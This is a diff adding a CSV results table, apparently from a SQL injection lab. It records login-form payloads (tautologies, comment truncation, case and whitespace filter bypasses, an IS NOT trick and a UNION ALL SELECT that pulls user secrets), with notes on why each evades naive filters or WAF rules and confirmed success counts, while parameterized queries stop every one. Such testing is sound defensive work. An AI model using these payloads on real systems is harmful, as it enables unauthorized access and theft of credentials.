@@ -1,0 +1,11 @@
+kind,field,payload,technique,no_defense,waf_v1_rule,waf_v1_confirmed,waf_v2_rule,waf_v2_confirmed,parameterized_confirmed
+part-A naive,user,admin' OR '1'='1,classic tautology,3/3,quote then OR (tautology),0/3,quote then OR (tautology),0/3,0/3
+part-A naive,user,admin'--,comment out the password check,3/3,quote then comment,0/3,quote then comment,0/3,0/3
+part-A bypass,user,admin' oR '1'='1,case: filter only strips ' OR '/' or ',3/3,quote then OR (tautology),0/3,quote then OR (tautology),0/3,0/3
+part-A bypass,user,admin'OR'1'='1,whitespace: filter needs spaces around OR,3/3,quote then OR (tautology),0/3,quote then OR (tautology),0/3,0/3
+part-A bypass,user,admin'/*,comment: SQLite accepts an unterminated /* */,3/3,quote then comment,0/3,quote then comment,0/3,0/3
+part-A bypass,user,admin'-#-,filter order: '#' removed after '--' leaves '--',0/3,PASS,0/3,any single quote,0/3,0/3
+waf-bypass,pw,x' IS NOT 'y,"no OR, no comment: (pw='x') IS NOT 'y' is always true, so user='admin' alone decides",3/3,PASS,3/3,any single quote,0/3,0/3
+waf-bypass,user,admin' AND 1--,"comment not adjacent to the quote, so 'quote then comment' never matches",3/3,PASS,3/3,any single quote,0/3,0/3
+waf-bypass,user,admin' AND 1/*,same idea with an unterminated /* comment,3/3,PASS,3/3,any single quote,0/3,0/3
+waf-bypass,user,"x' UNION ALL SELECT user, secret FROM users WHERE 1--",UNION ALL: the rule wants UNION directly followed by SELECT,3/3,PASS,3/3,any single quote,0/3,0/3
